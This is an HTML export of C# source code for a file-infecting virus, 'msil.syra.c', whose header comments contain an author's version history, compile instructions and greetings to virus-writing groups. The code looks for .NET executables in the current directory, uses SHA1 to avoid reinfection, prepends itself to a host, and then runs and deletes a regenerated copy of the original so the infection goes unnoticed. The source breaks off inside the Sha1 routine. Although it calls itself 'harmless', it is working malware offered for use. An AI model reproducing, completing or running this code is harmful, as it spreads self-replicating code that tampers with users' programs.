<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc2 {
	color: #008000;
}
.sc4 {
	color: #FF8000;
}
.sc5 {
	font-weight: bold;
	color: #0000FF;
}
.sc6 {
	color: #808080;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc11 {
}
.sc16 {
	color: #8000FF;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc2">//////////////////////////////
/////// syra.c //////////////
////////////////////////////
</span><span class="sc0">
</span><span class="sc2">//// msil.syra history
////
////  version a - prepends itself to w32 pe exe and msil exe files in current directory. inserts four byte marker
////              at the end of infected files. original hosts are regenerated to a single hardcoded file...
////
////  version b - prepends itself to msil exe files only in current directory. inserts four byte marker at the end
////              of infected files. original hosts are regenerated to a single hardcoded file...
////
////  syra.c prepends itself to msil exe files only in current directory. instead of inserting a four byte marker to
////  infected files, it uses SHA1 for anti-host reinfection and anti-self infection. original hosts are regenerated to
////  multiple files, so infected users won't know that there's something wrong with their dotnet files..
////
////  compilation :
////
////  csc /target:winexe thisfile
////
////
////  enjoy,
////
////  alcopaul
////  brigada ocho &amp; rrlf
////  september 30, 2002
////
////  http://alcopaul.host.sk
////  alcopaulvx@yahoo.com
////
////  greets
////  
////  brigada ocho (let us be THE HLL group.. :) )
////  rrlf (my home when i was lamer than lame)
////  philie (hehehe, what can i say, you adopted me when i was newbie)
////  slagehammer (thanks for the guidance when i was a newbie)
////  jackie (thanks for appreciating my work. one of my vx inspiration)
////  virusbuster (thanks for the avp.key, man.. and i hope you'll publish my contributions in 29a#7.. :) )
////  energy (let us always make projects together)
////  petik (come back! :) )
////  arkhangel (thanks for hosting our page)
////  herm1t (same as arkhangel's message)
////  secuxp (nihau!)
////  perrun fans and critics (the true jpeg virus will come out in the future. just ask microsoft..)
////  my fans (if any) (thanks for appreciating my works)
////  vxers (let us all explore the robust world of dotnet)
////
////
////   
////
//////////////////////////////////// warning : this is a harmless virus source code /////////////////////////////////////////
</span><span class="sc0">
</span><span class="sc11">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">IO</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Reflection</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Runtime</span><span class="sc10">.</span><span class="sc11">InteropServices</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Text</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Security</span><span class="sc10">.</span><span class="sc11">Cryptography</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc11">class</span><span class="sc0"> </span><span class="sc11">msil_syra_c</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
   </span><span class="sc11">public</span><span class="sc0"> </span><span class="sc11">class</span><span class="sc0"> </span><span class="sc11">w32api</span><span class="sc0"> </span><span class="sc2">// i'm using the dotnet sdk in windows me (heheheh) so i can't call some essential dotnet classes at development :(
</span><span class="sc0">   </span><span class="sc10">{</span><span class="sc0">
   </span><span class="sc10">[</span><span class="sc11">DllImport</span><span class="sc10">(</span><span class="sc6">"shell32.dll"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">CharSet</span><span class="sc10">=</span><span class="sc11">CharSet</span><span class="sc10">.</span><span class="sc11">Auto</span><span class="sc10">)]</span><span class="sc0">
   </span><span class="sc11">public</span><span class="sc0"> </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">extern</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">ShellExecute</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">hWnd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">String</span><span class="sc0"> </span><span class="sc11">oper</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">String</span><span class="sc0"> </span><span class="sc11">file</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">String</span><span class="sc0"> </span><span class="sc11">param</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">String</span><span class="sc0"> </span><span class="sc11">dir</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">type</span><span class="sc10">);</span><span class="sc0">
   </span><span class="sc10">[</span><span class="sc11">DllImport</span><span class="sc10">(</span><span class="sc6">"user32.dll"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">CharSet</span><span class="sc10">=</span><span class="sc11">CharSet</span><span class="sc10">.</span><span class="sc11">Auto</span><span class="sc10">)]</span><span class="sc0">
   </span><span class="sc11">public</span><span class="sc0"> </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">extern</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">MessageBox</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">hWnd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">String</span><span class="sc0"> </span><span class="sc11">text</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">String</span><span class="sc0"> </span><span class="sc11">caption</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">uint</span><span class="sc0"> </span><span class="sc11">type</span><span class="sc10">);</span><span class="sc0">
   </span><span class="sc10">}</span><span class="sc0">
   </span><span class="sc11">public</span><span class="sc0"> </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">Main</span><span class="sc10">(</span><span class="sc11">String</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">args</span><span class="sc10">)</span><span class="sc0">
   </span><span class="sc10">{</span><span class="sc0">
   </span><span class="sc11">Module</span><span class="sc0"> </span><span class="sc11">self</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Assembly</span><span class="sc10">.</span><span class="sc11">GetExecutingAssembly</span><span class="sc10">().</span><span class="sc11">GetModules</span><span class="sc10">()[</span><span class="sc4">0</span><span class="sc10">];</span><span class="sc0"> </span><span class="sc2">// thanks to Reflection
</span><span class="sc0">   </span><span class="sc11">string</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">hostfiles</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Directory</span><span class="sc10">.</span><span class="sc11">GetFiles</span><span class="sc10">(</span><span class="sc11">Directory</span><span class="sc10">.</span><span class="sc11">GetCurrentDirectory</span><span class="sc10">(),</span><span class="sc0"> </span><span class="sc6">"*.exe"</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc2">// gather the hostesses
</span><span class="sc0">   </span><span class="sc11">foreach</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">string</span><span class="sc0"> </span><span class="sc11">hostfile</span><span class="sc0"> </span><span class="sc11">in</span><span class="sc0"> </span><span class="sc11">hostfiles</span><span class="sc10">){</span><span class="sc0">
   </span><span class="sc11">try</span><span class="sc0">
   </span><span class="sc10">{</span><span class="sc0">
   </span><span class="sc11">AssemblyName</span><span class="sc10">.</span><span class="sc11">GetAssemblyName</span><span class="sc10">(</span><span class="sc11">hostfile</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc2">// check if msil using managed seh
</span><span class="sc0">   </span><span class="sc2">// msil file then examine for previous infection using SHA1
</span><span class="sc0">   </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Sha1</span><span class="sc10">(</span><span class="sc11">self</span><span class="sc10">.</span><span class="sc11">FullyQualifiedName</span><span class="sc10">)==</span><span class="sc11">Sha1</span><span class="sc10">(</span><span class="sc11">hostfile</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc2">// get sha1
</span><span class="sc0">   </span><span class="sc5">continue</span><span class="sc10">;</span><span class="sc0">
   </span><span class="sc5">else</span><span class="sc0">
   </span><span class="sc11">try</span><span class="sc0">
   </span><span class="sc10">{</span><span class="sc0">  
   </span><span class="sc11">Infect</span><span class="sc10">(</span><span class="sc11">hostfile</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc2">// the meat of the routine
</span><span class="sc0">   </span><span class="sc10">}</span><span class="sc0">
   </span><span class="sc11">catch</span><span class="sc0">
   </span><span class="sc10">{</span><span class="sc0">
   </span><span class="sc5">continue</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc2">// error infecting file (maybe it's running/readonly/etc.) .. goto next file
</span><span class="sc0">   </span><span class="sc10">}</span><span class="sc0">
   </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc2">// end after 1 infection
</span><span class="sc0">   </span><span class="sc10">}</span><span class="sc0">
   </span><span class="sc11">catch</span><span class="sc0">
   </span><span class="sc10">{</span><span class="sc0">
   </span><span class="sc5">continue</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc2">// dotnot, next file
</span><span class="sc0">   </span><span class="sc10">}</span><span class="sc0">
   </span><span class="sc10">}</span><span class="sc0">
   </span><span class="sc2">// extract host bytes from itself
</span><span class="sc0">   </span><span class="sc11">FileStream</span><span class="sc0"> </span><span class="sc11">fs1</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">new</span><span class="sc0"> </span><span class="sc11">FileStream</span><span class="sc10">(</span><span class="sc11">self</span><span class="sc10">.</span><span class="sc11">FullyQualifiedName</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FileMode</span><span class="sc10">.</span><span class="sc11">OpenOrCreate</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FileAccess</span><span class="sc10">.</span><span class="sc11">Read</span><span class="sc10">);</span><span class="sc0">
   </span><span class="sc11">BinaryReader</span><span class="sc0"> </span><span class="sc11">r1</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">new</span><span class="sc0"> </span><span class="sc11">BinaryReader</span><span class="sc10">(</span><span class="sc11">fs1</span><span class="sc10">);</span><span class="sc0">
   </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">host</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">fs1</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">;</span><span class="sc0">
   </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">vir</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">host</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">5632</span><span class="sc10">;</span><span class="sc0">
   </span><span class="sc11">r1</span><span class="sc10">.</span><span class="sc11">BaseStream</span><span class="sc10">.</span><span class="sc11">Seek</span><span class="sc10">(</span><span class="sc4">5632</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SeekOrigin</span><span class="sc10">.</span><span class="sc11">Begin</span><span class="sc10">);</span><span class="sc0">
   </span><span class="sc11">byte</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">bytes</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">new</span><span class="sc0"> </span><span class="sc11">byte</span><span class="sc10">[</span><span class="sc11">vir</span><span class="sc10">];</span><span class="sc0">
   </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">numBytesToRead</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">vir</span><span class="sc10">;</span><span class="sc0">
   </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">numBytesRead</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
   </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">numBytesToRead</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
   </span><span class="sc10">{</span><span class="sc0">
   </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">n</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">r1</span><span class="sc10">.</span><span class="sc11">Read</span><span class="sc10">(</span><span class="sc11">bytes</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">numBytesRead</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">numBytesToRead</span><span class="sc10">);</span><span class="sc0">
   </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">n</span><span class="sc10">==</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
   </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
   </span><span class="sc11">numBytesRead</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">n</span><span class="sc10">;</span><span class="sc0">
   </span><span class="sc11">numBytesToRead</span><span class="sc0"> </span><span class="sc10">-=</span><span class="sc0"> </span><span class="sc11">n</span><span class="sc10">;</span><span class="sc0">
   </span><span class="sc10">}</span><span class="sc0">
   </span><span class="sc11">r1</span><span class="sc10">.</span><span class="sc11">Close</span><span class="sc10">();</span><span class="sc0">
   </span><span class="sc2">// save host to file
</span><span class="sc0">   </span><span class="sc11">Random</span><span class="sc0"> </span><span class="sc11">ran</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">new</span><span class="sc0"> </span><span class="sc11">Random</span><span class="sc10">();</span><span class="sc0">
   </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">ty</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">ran</span><span class="sc10">.</span><span class="sc11">Next</span><span class="sc10">(</span><span class="sc4">2000</span><span class="sc10">);</span><span class="sc0">
   </span><span class="sc11">FileStream</span><span class="sc0"> </span><span class="sc11">fs11</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">new</span><span class="sc0"> </span><span class="sc11">FileStream</span><span class="sc10">(</span><span class="sc6">"p"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">ty</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"h.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FileMode</span><span class="sc10">.</span><span class="sc11">OpenOrCreate</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FileAccess</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">);</span><span class="sc0">
   </span><span class="sc11">BinaryWriter</span><span class="sc0"> </span><span class="sc11">w1</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">new</span><span class="sc0"> </span><span class="sc11">BinaryWriter</span><span class="sc10">(</span><span class="sc11">fs11</span><span class="sc10">);</span><span class="sc0">         
   </span><span class="sc11">w1</span><span class="sc10">.</span><span class="sc11">BaseStream</span><span class="sc10">.</span><span class="sc11">Seek</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SeekOrigin</span><span class="sc10">.</span><span class="sc11">Begin</span><span class="sc10">);</span><span class="sc0">
   </span><span class="sc11">w1</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">(</span><span class="sc11">bytes</span><span class="sc10">);</span><span class="sc0">
   </span><span class="sc11">w1</span><span class="sc10">.</span><span class="sc11">Close</span><span class="sc10">();</span><span class="sc0">
   </span><span class="sc11">string</span><span class="sc0"> </span><span class="sc11">rect</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Directory</span><span class="sc10">.</span><span class="sc11">GetCurrentDirectory</span><span class="sc10">();</span><span class="sc0">
   </span><span class="sc2">// execute host
</span><span class="sc0">   </span><span class="sc11">w32api</span><span class="sc10">.</span><span class="sc11">ShellExecute</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">null</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"p"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">ty</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"h.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">null</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">rect</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
   </span><span class="sc2">// use SEH to wait for host to terminate and delete it
</span><span class="sc0">   </span><span class="sc11">wet</span><span class="sc10">:</span><span class="sc0">
   </span><span class="sc11">try</span><span class="sc0">
   </span><span class="sc10">{</span><span class="sc0">
   </span><span class="sc11">File</span><span class="sc10">.</span><span class="sc11">Delete</span><span class="sc10">(</span><span class="sc6">"p"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">ty</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"h.exe"</span><span class="sc10">);</span><span class="sc0">
   </span><span class="sc10">}</span><span class="sc0">
   </span><span class="sc11">catch</span><span class="sc0">
   </span><span class="sc10">{</span><span class="sc0">
   </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">wet</span><span class="sc10">;</span><span class="sc0">
   </span><span class="sc10">}</span><span class="sc0">
   </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">File</span><span class="sc10">.</span><span class="sc11">Exists</span><span class="sc10">(</span><span class="sc6">"p"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">ty</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"h.exe"</span><span class="sc10">)==</span><span class="sc11">true</span><span class="sc10">)</span><span class="sc0">
   </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">wet</span><span class="sc10">;</span><span class="sc0">
   </span><span class="sc2">// display messagebox (25% probability)
</span><span class="sc0">   </span><span class="sc11">Random</span><span class="sc0"> </span><span class="sc11">t</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">new</span><span class="sc0"> </span><span class="sc11">Random</span><span class="sc10">();</span><span class="sc0">
   </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">t</span><span class="sc10">.</span><span class="sc11">Next</span><span class="sc10">(</span><span class="sc4">4</span><span class="sc10">)==</span><span class="sc4">3</span><span class="sc10">)</span><span class="sc0">
   </span><span class="sc11">w32api</span><span class="sc10">.</span><span class="sc11">MessageBox</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"::::only SHA1gging .NET files::::"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"msil.syra.c by alcopaul"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
   </span><span class="sc10">}</span><span class="sc0">
   </span><span class="sc11">public</span><span class="sc0"> </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">Infect</span><span class="sc10">(</span><span class="sc11">string</span><span class="sc0"> </span><span class="sc11">host</span><span class="sc10">)</span><span class="sc0">
   </span><span class="sc10">{</span><span class="sc0"> 
     </span><span class="sc2">// read self
</span><span class="sc0">     </span><span class="sc11">Module</span><span class="sc0"> </span><span class="sc11">mod</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Assembly</span><span class="sc10">.</span><span class="sc11">GetExecutingAssembly</span><span class="sc10">().</span><span class="sc11">GetModules</span><span class="sc10">()[</span><span class="sc4">0</span><span class="sc10">];</span><span class="sc0">
     </span><span class="sc11">FileStream</span><span class="sc0"> </span><span class="sc11">fs</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">new</span><span class="sc0"> </span><span class="sc11">FileStream</span><span class="sc10">(</span><span class="sc11">mod</span><span class="sc10">.</span><span class="sc11">FullyQualifiedName</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FileMode</span><span class="sc10">.</span><span class="sc11">OpenOrCreate</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FileAccess</span><span class="sc10">.</span><span class="sc11">Read</span><span class="sc10">);</span><span class="sc0">
     </span><span class="sc11">BinaryReader</span><span class="sc0"> </span><span class="sc11">r</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">new</span><span class="sc0"> </span><span class="sc11">BinaryReader</span><span class="sc10">(</span><span class="sc11">fs</span><span class="sc10">);</span><span class="sc0">        
     </span><span class="sc11">r</span><span class="sc10">.</span><span class="sc11">BaseStream</span><span class="sc10">.</span><span class="sc11">Seek</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SeekOrigin</span><span class="sc10">.</span><span class="sc11">Begin</span><span class="sc10">);</span><span class="sc0">
     </span><span class="sc11">byte</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">bytes</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">new</span><span class="sc0"> </span><span class="sc11">byte</span><span class="sc10">[</span><span class="sc4">5632</span><span class="sc10">];</span><span class="sc0">
     </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">numBytesToRead</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc4">5632</span><span class="sc10">;</span><span class="sc0">
     </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">numBytesRead</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
     </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">numBytesToRead</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
     </span><span class="sc10">{</span><span class="sc0">
     </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">n</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">r</span><span class="sc10">.</span><span class="sc11">Read</span><span class="sc10">(</span><span class="sc11">bytes</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">numBytesRead</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">numBytesToRead</span><span class="sc10">);</span><span class="sc0">
     </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">n</span><span class="sc10">==</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
     </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
     </span><span class="sc11">numBytesRead</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">n</span><span class="sc10">;</span><span class="sc0">
     </span><span class="sc11">numBytesToRead</span><span class="sc0"> </span><span class="sc10">-=</span><span class="sc0"> </span><span class="sc11">n</span><span class="sc10">;</span><span class="sc0">
      </span><span class="sc10">}</span><span class="sc0">
     </span><span class="sc11">r</span><span class="sc10">.</span><span class="sc11">Close</span><span class="sc10">();</span><span class="sc0">
     </span><span class="sc2">// read host
</span><span class="sc0">     </span><span class="sc11">FileStream</span><span class="sc0"> </span><span class="sc11">fs133</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">new</span><span class="sc0"> </span><span class="sc11">FileStream</span><span class="sc10">(</span><span class="sc11">host</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FileMode</span><span class="sc10">.</span><span class="sc11">OpenOrCreate</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FileAccess</span><span class="sc10">.</span><span class="sc11">Read</span><span class="sc10">);</span><span class="sc0">
     </span><span class="sc11">BinaryReader</span><span class="sc0"> </span><span class="sc11">w33</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">new</span><span class="sc0"> </span><span class="sc11">BinaryReader</span><span class="sc10">(</span><span class="sc11">fs133</span><span class="sc10">);</span><span class="sc0">
     </span><span class="sc11">w33</span><span class="sc10">.</span><span class="sc11">BaseStream</span><span class="sc10">.</span><span class="sc11">Seek</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SeekOrigin</span><span class="sc10">.</span><span class="sc11">Begin</span><span class="sc10">);</span><span class="sc0">
     </span><span class="sc11">byte</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">bytes2</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">new</span><span class="sc0"> </span><span class="sc11">byte</span><span class="sc10">[</span><span class="sc11">fs133</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">];</span><span class="sc0">
     </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">numBytesToRead2</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">fs133</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">;</span><span class="sc0">
     </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">numBytesRead2</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
     </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">numBytesToRead2</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
     </span><span class="sc10">{</span><span class="sc0">
     </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">n</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">w33</span><span class="sc10">.</span><span class="sc11">Read</span><span class="sc10">(</span><span class="sc11">bytes2</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">numBytesRead2</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">numBytesToRead2</span><span class="sc10">);</span><span class="sc0">
     </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">n</span><span class="sc10">==</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
     </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
     </span><span class="sc11">numBytesRead2</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">n</span><span class="sc10">;</span><span class="sc0">
     </span><span class="sc11">numBytesToRead2</span><span class="sc0"> </span><span class="sc10">-=</span><span class="sc0"> </span><span class="sc11">n</span><span class="sc10">;</span><span class="sc0">
     </span><span class="sc10">}</span><span class="sc0">
     </span><span class="sc11">w33</span><span class="sc10">.</span><span class="sc11">Close</span><span class="sc10">();</span><span class="sc0">
     </span><span class="sc2">// save self + host to hostfile
</span><span class="sc0">     </span><span class="sc11">FileStream</span><span class="sc0"> </span><span class="sc11">fs1</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">new</span><span class="sc0"> </span><span class="sc11">FileStream</span><span class="sc10">(</span><span class="sc11">host</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FileMode</span><span class="sc10">.</span><span class="sc11">OpenOrCreate</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FileAccess</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">);</span><span class="sc0">
     </span><span class="sc11">BinaryWriter</span><span class="sc0"> </span><span class="sc11">w</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">new</span><span class="sc0"> </span><span class="sc11">BinaryWriter</span><span class="sc10">(</span><span class="sc11">fs1</span><span class="sc10">);</span><span class="sc0">         
     </span><span class="sc11">w</span><span class="sc10">.</span><span class="sc11">BaseStream</span><span class="sc10">.</span><span class="sc11">Seek</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SeekOrigin</span><span class="sc10">.</span><span class="sc11">Begin</span><span class="sc10">);</span><span class="sc0">
     </span><span class="sc11">w</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">(</span><span class="sc11">bytes</span><span class="sc10">);</span><span class="sc0">
     </span><span class="sc11">w</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">(</span><span class="sc11">bytes2</span><span class="sc10">);</span><span class="sc0">
     </span><span class="sc11">w</span><span class="sc10">.</span><span class="sc11">Close</span><span class="sc10">();</span><span class="sc0">
     </span><span class="sc10">}</span><span class="sc0">
   </span><span class="sc11">public</span><span class="sc0"> </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc11">string</span><span class="sc0"> </span><span class="sc11">Sha1</span><span class="sc10">(</span><span class="sc11">string</span><span class="sc0"> </span><span class="sc11">data</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc2">// get SHA1 of first 2048 bytes of input file
</span><span class="sc0">   </span><span class="sc10">{</span><span class="sc0">
